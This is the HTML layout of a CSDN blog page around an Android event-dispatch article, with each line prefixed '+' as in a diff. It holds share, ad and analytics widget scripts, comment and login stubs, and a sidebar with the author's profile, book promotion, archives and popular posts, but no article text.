+<script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "1", "bdMiniList": false, "bdPic": "", "bdStyle": "0", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];</script>
+<!-- Baidu Button END -->
+
+   <link rel="stylesheet" href="http://static.blog.csdn.net/css/blog_detail.css" />
+
+    
+<!--172.16.140.11-->
+
+<!-- Baidu Button BEGIN -->
+<script type="text/javascript" id="bdshare_js" data="type=tools&amp;uid=1536434" ></script>
+<script type="text/javascript" id="bdshell_js"></script>
+<script type="text/javascript">
+    document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + Math.ceil(new Date()/3600000)
+</script>
+<!-- Baidu Button END -->
+
+ 
+
+
+        <div id="digg" ArticleId="9097463" >
+            <dl id="btnDigg" class="digg digg_disable"  onclick="btndigga();">
+               
+                 <dt>顶</dt>
+                <dd>338</dd>
+            </dl>
+           
+              
+            <dl id="btnBury" class="digg digg_disable"  onclick="btnburya();">
+              
+                  <dt>踩</dt>
+                <dd>23</dd>               
+            </dl>
+            
+        </div>
+     <div class="tracking-ad" data-mod="popu_222"><a href="javascript:void(0);" >&nbsp;</a>   </div>
+    <div class="tracking-ad" data-mod="popu_223"> <a href="javascript:void(0);" >&nbsp;</a></div>
+    <script type="text/javascript">
+                function btndigga() {
+                    $(".tracking-ad[data-mod='popu_222'] a").click();
+                }
+                function btnburya() {
+                    $(".tracking-ad[data-mod='popu_223'] a").click();
+                }
+            </script>
+
+   <ul class="article_next_prev">
+                <li class="prev_article"><span  onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_shangyipian']);location.href='/guolin_blog/article/details/9050671';">上一篇</span><a href="/guolin_blog/article/details/9050671" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_shangyipian'])">Android系统联系人全特效实现(下)，字母表快速滚动</a></li>
+                <li class="next_article"><span onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_xiayipian']);location.href='/guolin_blog/article/details/9153753';">下一篇</span><a href="/guolin_blog/article/details/9153753" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_xiayipian'])">Java设计模式透析之 —— 组合(Composite)</a></li>
+    </ul>
+
+    <div style="clear:both; height:10px;"></div>
+
+
+        <div class="similar_article"  style="display:none">
+                <h4>我的同类文章</h4>
+                <div class="similar_c"style="margin:20px 0px 0px 0px">
+                    <div class="similar_c_t">
+                                <label class="similar_cur">
+                                    <span  style="cursor:pointer"  onclick="GetCategoryArticles('1399638','sinyu890807','foot','9097463');">Android疑难解析<em>（35）</em></span>
+                                </label>
+                    </div>
+                   
+                    <div class="similar_wrap tracking-ad" data-mod="popu_141"  style="max-height:195px;">
+                        <a href="http://blog.csdn.net" style="display:none">http://blog.csdn.net</a>
+                        <ul class="similar_list fl">                          
+                        </ul>
+
+                        <ul class="similar_list fr">                           
+                        </ul>
+                    </div>
+                </div>
+            </div>    
+    <script  type="text/javascript">
+        $(function () {
+            GetCategoryArticles('1399638', 'sinyu890807','foot','9097463');
+        });
+    </script>
+      
+</div>
+
+     <div>
+                <script type="text/javascript">
+                    /*博客内容页下方Banner1-960*90，创建于2016-12-13*/
+                    var cpro_id = "u2843955";
+                </script>
+                <script type="text/javascript" src="http://cpro.baidustatic.com/cpro/ui/c.js"></script>
+    </div>
+
+<div id="suggest"></div>
+         <script  language="javascript" type='text/javascript'>     
+             $(function(){
+                 $.get("/sinyu890807/svc/GetSuggestContent/9097463",function(data){
+                     $("#suggest").html(data);
+                 });     
+             });             
+         </script>  
+
+
+<style>
+.blog-ass-articl dd {
+color: #369;
+width: 99%; /*修改行*/
+float: left;
+overflow: hidden;
+font: normal normal 12px/23px "SimSun";
+height: 23px;
+margin: 0;
+padding: 0 0 0 10px;
+margin-right: 30px;
+background: url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;
+}
+</style>
+
+ <link rel="stylesheet" href="http://static.blog.csdn.net/css/replace.css"/>
+<div id="relate" data-mod="popu_218"  class="tracking-ad">
+        <div class="relate_t">
+            <h3><span>参考知识库</span></h3>
+        </div>
+        <div class="relate_c">
+        </div>
+</div>
+ 
+
+<dl class="blog-ass-articl" id="res-relatived" > 
+    <div class="embody embody_b" id="libkeyparent"  style="display:none">
+            <span class="embody_t">更多资料请参考：</span>
+            <div class="embody_c" id="libkey"></div>
+    </div>
+
+
+     <dt><span>猜你在找</span></dt>    
+
+
+   
+
+
+    <div id="adCollege" style="width: 42%;float: left;"> 
+        <script src="http://csdnimg.cn/jobreco/job_reco.js" type="text/javascript"></script> 
+        <script type="text/javascript">
+            csdn.position.showEdu({
+                sourceType: "blog",
+                searchType: "detail",
+                searchKey: "9097463",
+                username: "",
+                recordcount: "5",
+                containerId: "adCollege" //容器DIV的id。 
+            });
+            
+            setEduLoc();
+
+            function setEduLoc() {               
+                var edus = $("#adCollege div dd a");
+                if (edus.length == 0) {
+                    setTimeout(function () {
+                        setEduLoc();
+                    }, 500);
+                }
+                else {
+                    var eduLoc = "?ref=blog&loc=0";
+                    $.each(edus, function (index,item) {
+                        var href = $(this).attr("href") + eduLoc;
+                        $(this).attr("href", href);
+                    });
+                }
+            }
+
+        </script> 
+    </div>  
+
+    
+     <div id="res"  data-mod="popu_36"  class="tracking-ad" style="width: 42%;float: left;margin-right: 30px;"></div>
+   
+</dl>
+
+
+<script type="text/javascript">
+    $(function () {
+        setTimeout(function () {
+            var searchtitletags = 'Android事件分发机制完全解析，带你从源码的角度彻底理解(上)' + ',' + $("#tags").html();
+            searchService({
+                index: 'blog',
+                query: searchtitletags,
+                from: 5,
+                size: 5,
+                appendTo: '#res',
+                url: 'recommend',
+                his: 2,
+                client: "blog_cf_enhance",
+                tmpl: '<dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="#{ url }" title="#{ title }" strategy="#{ strategy }">#{ title }</a></dd>'
+            });
+        }, 500);
+    });    
+
+ </script>  
+
+
+    <div id="ad_cen">        
+                    <script type="text/javascript">
+                        /*博客内容页下方Banner-728*90，创建于2014-7-3*/
+                        var cpro_id = "u1607657";
+                    </script>
+                    <script type="text/javascript" src="http://cpro.baidustatic.com/cpro/ui/c.js"></script>
+    </div>  
+
+
+<div class="comment_class">
+    <div id="comment_title" class="panel_head">
+        <span class="see_comment">查看评论</span><a name="comments"></a></div>
+    <div id="comment_list">
+    </div>
+    <div id="comment_bar">
+    </div>
+    <div id="comment_form">
+    </div>
+    <div class="announce">
+        * 以上用户言论只代表其个人观点，不代表CSDN网站的观点或立场<a name="reply"></a><a name="quote"></a></div>
+</div>
+
+<script type="text/javascript">
+    var fileName = '9097463';
+    var commentscount = 277;
+    var islock = false
+</script>
+<script type="text/javascript" src="http://static.blog.csdn.net/scripts/comment.js"></script>
+    <div id="ad_bot">
+    </div>
+<div id="report_dialog">
+</div>
+
+<div id="d-top"  style="bottom:60px;">
+
+        <a id="quick-reply" class="btn btn-top q-reply" title="快速回复" style="display:none;">
+            <img src="http://static.blog.csdn.net/images/blog-icon-reply.png" alt="快速回复">
+        </a>    
+    <a id="d-top-a" class="btn btn-top backtop"  style="display: none;" title="返回顶部" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_huidaodingbu'])" style="">         
+         <img src="http://static.blog.csdn.net/images/top.png" alt="TOP">
+    </a>
+</div>
+<script type="text/javascript">
+    $(function ()
+    {
+        $("#ad_frm_0").height("90px");
+        
+        setTimeout(function(){
+            $("#ad_frm_2").height("200px");
+        },1000);    
+    });
+  
+</script>
+<style type="text/css">
+    .tag_list
+    {
+        background: none repeat scroll 0 0 #FFFFFF;
+        border: 1px solid #D7CBC1;
+        color: #000000;
+        font-size: 12px;
+        line-height: 20px;
+        list-style: none outside none;
+        margin: 10px 2% 0 1%;
+        padding: 1px;
+    }
+    .tag_list h5
+    {
+        background: none repeat scroll 0 0 #E0DBD3;
+        color: #47381C;
+        font-size: 12px;
+        height: 24px;
+        line-height: 24px;
+        padding: 0 5px;
+        margin: 0;
+    }
+    .tag_list h5 a
+    {
+        color: #47381C;
+    }
+    .classify
+    {
+        margin: 10px 0;
+        padding: 4px 12px 8px;
+    }
+    .classify a
+    {
+        margin-right: 20px;
+        white-space: nowrap;
+    }
+</style>
+
+
+<div class="tag_list" style="display:none"></div>
+  <script  language="javascript" type='text/javascript'>     
+      $(function(){
+              setTimeout(function(){
+                  $.get("/sinyu890807/svc/GetTagContent",function(data){
+                      $(".tag_list").html(data).show();
+                  });     
+              });
+          },500);                       
+ </script> 
+
+
+<div id="pop_win" style="display:none ;position: absolute; z-index: 10000; border: 1px solid rgb(220, 220, 220); top: 222.5px; left: 630px; opacity: 1; background: none 0px 0px repeat scroll rgb(255, 255, 255);">
+    
+</div>
+<div id="popup_mask"></div>
+<style>
+    #popup_mask
+    {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        background: #000;
+        z-index: 9999;
+        left: 0px;
+        top: 0px;
+        opacity: 0.3;
+        filter: alpha(opacity=30);
+        display: none;
+    }
+
+</style>
+
+
+
+
+<script type="text/javascript">
+    $(function(){
+        setTimeout(function(){
+            $(".comment_body:contains('回复')").each(function(index,item){
+                var u=$(this).text().split('：')[0].toString().replace("回复","")
+                var thisComment=$(this);
+                if(u)
+                {
+                    $.getJSON("https://passport.csdn.net/get/nick?callback=?", {users: u}, function(a) {
+                        if(a!=null&&a.data!=null&&a.data.length>0)
+                        {
+                            nick=a.data[0].n; 
+                            if(u!=nick)
+                            {
+                                thisComment.text(thisComment.text().replace(u,nick));  
+                            }
+                        }       
+                    });  
+                }
+            });         
+
+        },200);  
+
+        setTimeout(function(){
+            $(".math").each(function(index,value){$(this).find("span").last().css("color","#fff"); })
+        },5000);
+
+        setTimeout(function(){
+            $(".math").each(function(index,value){$(this).find("span").last().css("color","#fff"); })
+        },10000);
+
+        setTimeout(function(){
+            $(".math").each(function(index,value){$(this).find("span").last().css("color","#fff"); })
+        },15000);
+        
+        setTimeout(function(){
+            $("a img[src='http://js.tongji.linezing.com/stats.gif']").parent().css({"position":"absolute","left":"50%"});
+        },300);
+    });
+
+    function loginbox(){
+        var $logpop=$("#pop_win");
+        $logpop.html('<iframe src="https://passport.csdn.net/account/loginbox?service=http://static.blog.csdn.net/callback.htm" frameborder="0" height="600" width="400" scrolling="no"></iframe>');
+
+        $('#popup_mask').css({
+            opacity: 0.5,
+            width: $( document ).width() + 'px',
+            height:  $( document ).height() + 'px'
+        });
+        $('#popup_mask').css("display","block");
+ 
+        $logpop.css( {
+            top: ($( window ).height() - $logpop.height())/ 2  + $( window 
+       ).scrollTop() + 'px',
+            left:($( window ).width() - $logpop.width())/ 2
+        } );
+ 
+        setTimeout( function () {
+            $logpop.show();
+            $logpop.css( {
+                opacity: 1
+            } );
+        }, 200 );
+ 
+        $('#popup_mask').unbind("click");
+        $('#popup_mask').bind("click", function(){
+            $('#popup_mask').hide();
+            var $clopop = $("#pop_win");
+            $("#common_ask_div_sc").css("display","none");
+            $clopop.css( {
+                opacity: 0
+            } );
+            setTimeout( function () {
+                $clopop.hide();
+            }, 350 );
+            return false;
+        });
+    }   
+
+</script>
+ <script language="javascript" type="text/javascript" src="http://ads.csdn.net/js/async_new.js"></script>      
+
+
+
+
+                        <div class="clear">
+                        </div>
+                    </div>                   
+                
+            </div>
+                   
+           <div id="side">
+               
+    <div class="side">
+<div id="panel_Profile" class="panel">
+<ul class="panel_head"><span>个人资料</span></ul>
+<ul class="panel_body profile">
+<div id="blog_userface">
+    <a href="http://my.csdn.net/sinyu890807" target="_blank">
+    <img src="http://avatar.csdn.net/8/B/B/1_sinyu890807.jpg" title="访问我的空间" style="max-width:90%"/>
+    </a>
+    <br />
+    <span><a href="http://my.csdn.net/sinyu890807" class="user_name" target="_blank">sinyu890807</a></span>
+</div>
+<div class="interact">
+
+    <a href="javascript:void(0);" class="attent" id="span_add_follow" title="[加关注]"></a>
+
+ <a href="javascript:void(0);" class="letter"  title="[发私信]" onclick="window.open('http://msg.csdn.net/letters/model?receiver=sinyu890807','_blank','height=350,width=700');_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_sixin'])"></a>  
+</div>
+<div id="blog_medal">
+                       <div class="ico_expert"  onclick="javascript:location='http://blog.csdn.net/experts/rule.html'" title="CSDN认证专家" style="cursor:pointer;width:60px;height:60px;background:url('http://c.csdnimg.cn/jifen/images/xunzhang/xunzhang/bokezhuanjiamiddle.png') no-repeat" ></div>
+                <div id="bms_box">
+                                            <a  target="_blank">
+                                                    <img src="http://c.csdnimg.cn/jifen/images/xunzhang/xunzhang/zhuanlandaren.png" onmouseover="m_over_m(this,2)" onmouseout="m_out_m()" alt="1" >
+                                            </a>
+                                            <a  target="_blank">
+                                                    <img src="http://c.csdnimg.cn/jifen/images/xunzhang/xunzhang/bokezhixing.png" onmouseover="m_over_m(this,6)" onmouseout="m_out_m()" alt="1" >
+                                            </a>
+               </div>
+</div>
+<ul id="blog_rank">
+    <li>访问：<span>5799484次</span></li>
+    <li>积分：<span>37290</span> </li>    
+    <li >等级： <span style="position:relative;display:inline-block;z-index:1" >
+            <img src="http://c.csdnimg.cn/jifen/images/xunzhang/jianzhang/blog8.png" alt="" style="vertical-align: middle;" id="leveImg">
+            <div id="smallTittle" style=" position: absolute;  left: -24px;  top: 25px;  text-align: center;  width: 101px;  height: 32px;  background-color: #fff;  line-height: 32px;  border: 2px #DDDDDD solid;  box-shadow: 0px 2px 2px rgba (0,0,0,0.1);  display: none;   z-index: 999;">
+            <div style="left: 42%;  top: -8px;  position: absolute;  width: 0;  height: 0;  border-left: 10px solid transparent;  border-right: 10px solid transparent;  border-bottom: 8px solid #EAEAEA;"></div>
+            积分：37290 </div>
+        </span>  </li>
+    <li>排名：<span>第90名</span></li>
+</ul>
+<ul id="blog_statistics">
+    <li>原创：<span>94篇</span></li>
+    <li>转载：<span>0篇</span></li>
+    <li>译文：<span>6篇</span></li>
+    <li>评论：<span>12272条</span></li>
+</ul>
+</ul>
+</div>
+
+
+
+
+<div id="custom_column_36348469" class="panel">
+<ul class="panel_head"><span>我的新书</span></ul>
+<ul class="panel_body">
+<p>《第二行代码》已出版<br>新书基于Android 7.0系统全面升级<br>全书使用Android Studio 2.2进行开发<br>更加入了许多振奋人心的新技术<br>
+<br>
+</p><center><a href="http://blog.csdn.net/sinyu890807/article/details/52032038"><img src="http://img.blog.csdn.net/20161124140922633"></a></center>
+<div style="width:130px; margin-left: auto; margin-right: auto; margin-top: 5px">
+<center>
+<p><a target="_blank" href="http://blog.csdn.net/sinyu890807/article/details/52032038">查看详情</a></p><p></p></center>
+<br>
+网上购买：
+<center>
+<p>
+<a target="_blank" href="https://item.jd.com/12012505.html">京东</a>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<a target="_blank" href="https://detail.tmall.com/item.htm?spm=a220m.1000858.1000725.1.MhmBGe&id=542237674970&user_id=1664456249&cat_id=2&is_b=1&rn=a9203a4191279b2a55a7886930db4e95">天猫</a> 
+<br>
+<a target="_blank" href="http://product.dangdang.com/24144166.html">当当</a>
+&nbsp;&nbsp;&nbsp;&nbsp;
+<a target="_blank" href="https://www.amazon.cn/dp/B01MSR5D04">亚马逊</a>
+
+</p>
+</center>
+</div>
+</ul>
+</div>
+
+<div id="custom_column_22765363" class="panel">
+<ul class="panel_head"><span>微信公众号推荐</span></ul>
+<ul class="panel_body">
+<p>关注我的技术公众号，每天都有优质技术文章推送。</p>
+<p></p><center><img style="width:200px; height:200px" src="http://img.blog.csdn.net/20160507110203928"></center><p></p>
+
+<p>关注我的娱乐公众号，工作、学习累了的时候放松一下自己。</p>
+<p></p><center><img style="width:200px; height:200px" src="http://img.blog.csdn.net/20161011100137978"></center><p></p>
+
+<p></p><center><b>微信扫一扫上方二维码即可关注</b></center><p></p>
+</ul>
+</div>
+
+<div id="custom_column_26685579" class="panel">
+<ul class="panel_head"><span>共同进步</span></ul>
+<ul class="panel_body">
+<span style="display:block;">感兴趣的朋友可以加入我的QQ群，一起讨论学习，共同进步。</span><br>
+<span style="display:block;"><font color="#f00">群号：168873001</font></span><br>
+<span style="display:none;">人数有限，请不要重复加群</span>
+<span style="display:none;"><font color="#f9920d">(即满)</font></span>
+</ul>
+</div><div id="panel_Category" class="panel">
+    <ul class="panel_head"><span>博客专栏</span></ul>
+    <ul class="panel_body" id="sp_column">
+    <table cellpadding="0" cellspacing="0"><tr>
+    <td style="padding:10px 10px 0 0;">
+    <a href="http://blog.csdn.net/column/details/android-database-pro.html" target="_blank"><img src="http://img.blog.csdn.net/20151123180007942" style="width:75px;height:75px;" /></a>
+    </td>
+    <td style="padding:10px 0; vertical-align:top;">
+    <a href="http://blog.csdn.net/column/details/android-database-pro.html" target="_blank">Android数据库高手秘籍</a>
+    <p>文章：9篇</p>
+    <span>阅读：400206</span>
+    </td>
+    </tr></table>
+    </ul>
+</div>
+
+<div id="custom_column_37398049" class="panel">
+<ul class="panel_head"><span>友情链接</span></ul>
+<ul class="panel_body">
+<a target="_blank" href="http://blog.csdn.net/lmj623565791">鸿洋的博客</a>
+<br><br>
+<a target="_blank" href="http://blog.csdn.net/xiaanming">夏安明的博客</a>
+<br><br>
+<a target="_blank" href="http://stormzhang.com/">stormzhang的博客</a>
+<br><br>
+<a target="_blank" href="http://www.jikedaohang.com/">极客导航</a>
+</ul>
+</div><div id="panel_Category" class="panel">
+<ul class="panel_head"><span>文章分类</span></ul>
+<ul class="panel_body">    
+                 <li>
+                    <a href="/sinyu890807/article/category/1369150" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); ">Android精华教程</a><span>(21)</span>
+                </li>
+                 <li>
+                    <a href="/sinyu890807/article/category/1399638" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); ">Android疑难解析</a><span>(36)</span>
+                </li>
+                 <li>
+                    <a href="/sinyu890807/article/category/2400923" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); ">Android第一行代码</a><span>(4)</span>
+                </li>
+                 <li>
+                    <a href="/sinyu890807/article/category/2522725" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); ">Android数据库高手秘籍</a><span>(5)</span>
+                </li>
+                 <li>
+                    <a href="/sinyu890807/article/category/1381137" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); ">Java设计模式透析</a><span>(5)</span>
+                </li>
+                 <li>
+                    <a href="/sinyu890807/article/category/1380837" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); ">Ruby设计模式透析</a><span>(5)</span>
+                </li>
+                 <li>
+                    <a href="/sinyu890807/article/category/1807611" onclick="_gaq.push(['_trackEvent','function', 'onclick', 'blog_articles_wenzhangfenlei']); ">随笔</a><span>(7)</span>
+                </li>
+</ul>
+</div><div id="panel_Archive" class="panel">
+<ul class="panel_head"><span>文章存档</span></ul>
+<ul class="panel_body">
+<div id="archive_list">
+<!--归档统计-->
+<li><a href="/sinyu890807/article/month/2017/02">2017年02月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2016/12">2016年12月</a><span>(2)</span></li><li><a href="/sinyu890807/article/month/2016/11">2016年11月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2016/10">2016年10月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2016/08">2016年08月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2016/07">2016年07月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2016/06">2016年06月</a><span>(2)</span></li><li><a href="/sinyu890807/article/month/2016/05">2016年05月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2016/04">2016年04月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2016/03">2016年03月</a><span>(2)</span></li><li><a href="/sinyu890807/article/month/2016/02">2016年02月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2016/01">2016年01月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2015/12">2015年12月</a><span>(2)</span></li><li><a href="/sinyu890807/article/month/2015/11">2015年11月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2015/10">2015年10月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2015/08">2015年08月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2015/07">2015年07月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2015/06">2015年06月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2015/05">2015年05月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2015/04">2015年04月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2015/03">2015年03月</a><span>(2)</span></li><li><a href="/sinyu890807/article/month/2015/02">2015年02月</a><span>(2)</span></li><li><a href="/sinyu890807/article/month/2014/12">2014年12月</a><span>(3)</span></li><li><a href="/sinyu890807/article/month/2014/11">2014年11月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2014/10">2014年10月</a><span>(2)</span></li><li><a href="/sinyu890807/article/month/2014/09">2014年09月</a><span>(5)</span></li><li><a href="/sinyu890807/article/month/2014/08">2014年08月</a><span>(3)</span></li><li><a href="/sinyu890807/article/month/2014/07">2014年07月</a><span>(3)</span></li><li><a href="/sinyu890807/article/month/2014/06">2014年06月</a><span>(2)</span></li><li><a href="/sinyu890807/article/month/2014/05">2014年05月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2014/04">2014年04月</a><span>(3)</span></li><li><a href="/sinyu890807/article/month/2014/03">2014年03月</a><span>(1)</span></li><li><a href="/sinyu890807/article/month/2014/01">2014年01月</a><span>(2)</span></li><li><a href="/sinyu890807/article/month/2013/12">2013年12月</a><span>(5)</span></li><li><a href="/sinyu890807/article/month/2013/11">2013年11月</a><span>(4)</span></li><li><a href="/sinyu890807/article/month/2013/10">2013年10月</a><span>(4)</span></li><li><a href="/sinyu890807/article/month/2013/09">2013年09月</a><span>(4)</span></li><li><a href="/sinyu890807/article/month/2013/08">2013年08月</a><span>(4)</span></li><li><a href="/sinyu890807/article/month/2013/07">2013年07月</a><span>(5)</span></li><li><a href="/sinyu890807/article/month/2013/06">2013年06月</a><span>(5)</span></li><li><a href="/sinyu890807/article/month/2013/05">2013年05月</a><span>(5)</span></li><li><a href="/sinyu890807/article/month/2013/04">2013年04月</a><span>(6)</span></li><li><a href="/sinyu890807/article/month/2013/03">2013年03月</a><span>(4)</span></li>
+</div>
+</ul>
+</div>
+<div id="hotarticls" class="panel">
+<ul class="panel_head">
+    <span>       
+阅读排行    </span>
+</ul>
+
+<ul class="panel_body itemlist">
+<li>
+<a href="/guolin_blog/article/details/9097463" title="Android事件分发机制完全解析，带你从源码的角度彻底理解(上)">Android事件分发机制完全解析，带你从源码的角度彻底理解(上)</a><span>(238229)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/8881711" title="Android Fragment完全解析，关于碎片你所需知道的一切">Android Fragment完全解析，关于碎片你所需知道的一切</a><span>(235921)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/17482095" title="Android Volley完全解析(一)，初识Volley的基本用法">Android Volley完全解析(一)，初识Volley的基本用法</a><span>(219066)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/12921889" title="Android LayoutInflater原理分析，带你一步步深入了解View(一)">Android LayoutInflater原理分析，带你一步步深入了解View(一)</a><span>(187362)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/16330267" title="Android视图绘制流程完全解析，带你一步步深入了解View(二)">Android视图绘制流程完全解析，带你一步步深入了解View(二)</a><span>(145936)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/9316683" title="Android高效加载大图、多图解决方案，有效避免程序OOM">Android高效加载大图、多图解决方案，有效避免程序OOM</a><span>(143045)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/11952435" title="Android Service完全解析，关于服务你所需知道的一切(上)">Android Service完全解析，关于服务你所需知道的一切(上)</a><span>(142620)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/18234477" title="Android ActionBar完全解析，使用官方推荐的最佳导航栏(上)">Android ActionBar完全解析，使用官方推荐的最佳导航栏(上)</a><span>(134582)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/17482165" title="Android Volley完全解析(二)，使用Volley加载网络图片">Android Volley完全解析(二)，使用Volley加载网络图片</a><span>(120316)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/13171191" title="Android Fragment应用实战，使用碎片向ActivityGroup说再见">Android Fragment应用实战，使用碎片向ActivityGroup说再见</a><span>(115380)</span>
+</li>
+</ul>
+</div>
+<div id="hotarticls2" class="panel">
+<ul class="panel_head"><span>评论排行</span></ul>
+<ul class="panel_body itemlist">
+<li>
+<a href="/guolin_blog/article/details/26365913" title="历时一年，我的著作《第一行代码——Android》已出版！">历时一年，我的著作《第一行代码——Android》已出版！</a><span>(719)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/52032038" title="历久而新，我的新书《第二行代码》已出版！">历久而新，我的新书《第二行代码》已出版！</a><span>(426)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/12921889" title="Android LayoutInflater原理分析，带你一步步深入了解View(一)">Android LayoutInflater原理分析，带你一步步深入了解View(一)</a><span>(329)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/34093441" title="Android照片墙完整版，完美结合LruCache和DiskLruCache">Android照片墙完整版，完美结合LruCache和DiskLruCache</a><span>(312)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/9097463" title="Android事件分发机制完全解析，带你从源码的角度彻底理解(上)">Android事件分发机制完全解析，带你从源码的角度彻底理解(上)</a><span>(277)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/9671609" title="Android双向滑动菜单完全解析，教你如何一分钟实现双向滑动特效">Android双向滑动菜单完全解析，教你如何一分钟实现双向滑动特效</a><span>(266)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/9255575" title="Android下拉刷新完全解析，教你如何一分钟实现下拉刷新功能">Android下拉刷新完全解析，教你如何一分钟实现下拉刷新功能</a><span>(265)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/13171191" title="Android Fragment应用实战，使用碎片向ActivityGroup说再见">Android Fragment应用实战，使用碎片向ActivityGroup说再见</a><span>(253)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/49805231" title="2015年终总结，忙碌和无所事事的一年">2015年终总结，忙碌和无所事事的一年</a><span>(253)</span>
+</li>
+<li>
+<a href="/guolin_blog/article/details/8744400" title="Android滑动菜单框架完全解析，教你如何一分钟实现滑动菜单特效">Android滑动菜单框架完全解析，教你如何一分钟实现滑动菜单特效</a><span>(251)</span>
+</li>
+</ul>
+</div>
+<div id="newcomments" class="panel">
+<ul class="panel_head"><span>最新评论</span></ul>
+<ul class="panel_body itemlist">
+    <li>
+   
+         <a href="/guolin_blog/article/details/26365913#comments">历时一年，我的著作《第一行代码——Android》已出版！</a>
+    <p style="margin:0px;"><a href="/baidu_25036201" class="user_name">baidu_25036201</a>:
+郭先生，你好。我是《第一行代码-Android》(第一版红色封面)的读者。我想请教两个关于书中syn...
+    </p>
+    </li>
+    <li>
+   
+         <a href="/guolin_blog/article/details/9153747#comments">Android事件分发机制完全解析，带你从源码的角度彻底理解(下)</a>
+    <p style="margin:0px;"><a href="/lb1207087645" class="user_name">lb1207087645</a>:
+大神分析的源码版本是api多少的？
+    </p>
+    </li>
+    <li>
+   
+         <a href="/guolin_blog/article/details/39345833#comments">Android数据库高手秘籍(五)——LitePal的存储操作</a>
+    <p style="margin:0px;"><a href="/kllkko" class="user_name">kllkko</a>:
+@Backkom1209:  同关联不上，请问你解决了吗
+    </p>
+    </li>
+    <li>
+   
+         <a href="/guolin_blog/article/details/52032038#comments">历久而新，我的新书《第二行代码》已出版！</a>
+    <p style="margin:0px;"><a href="/u013046774" class="user_name">u013046774</a>:
+第一行代码呢？
+    </p>
+    </li>
+    <li>
+   
+         <a href="/guolin_blog/article/details/51763825#comments">Android状态栏微技巧，带你真正理解沉浸式模式</a>
+    <p style="margin:0px;"><a href="/liuyi1207164339" class="user_name">liuyi1207164339</a>:
+其实就是Material Design主题当中的特性。。
+    </p>
+    </li>
+    <li>
+   
+         <a href="/guolin_blog/article/details/51763825#comments">历久而新，我的新书《第二行代码》已出版！</a>
+    <p style="margin:0px;"><a href="/qq_34439980" class="user_name">qq_34439980</a>:
+您好，大一小白，自学安卓开发，跟着您的书学习，在自己创建第一个活动的时候，setContentVie...
+    </p>
+    </li>
+    <li>
+   
+         <a href="/guolin_blog/article/details/51763825#comments">历久而新，我的新书《第二行代码》已出版！</a>
+    <p style="margin:0px;"><a href="/qq_34439980" class="user_name">qq_34439980</a>:
+您好，大一小白，自学安卓开发，跟着您的书学习，在自己创建第一个活动的时候，setContentVie...
+    </p>
+    </li>
+    <li>
+   
+         <a href="/guolin_blog/article/details/40083685#comments">Android数据库高手秘籍(六)——LitePal的修改和删除操作</a>
+    <p style="margin:0px;"><a href="/u011418943" class="user_name">u011418943</a>:
+郭神，看了你的微信公众号过来学习litepal，确实比greendao好用多了，但是发现在updat...
+    </p>
+    </li>
+    <li>
+   
+         <a href="/guolin_blog/article/details/40083685#comments">历久而新，我的新书《第二行代码》已出版！</a>
+    <p style="margin:0px;"><a href="/hanlin740473789" class="user_name">hanlin740473789</a>:
+郭老师，在学习百度LBS时，发现代码用不了，是代码出了问题吗
+    </p>
+    </li>
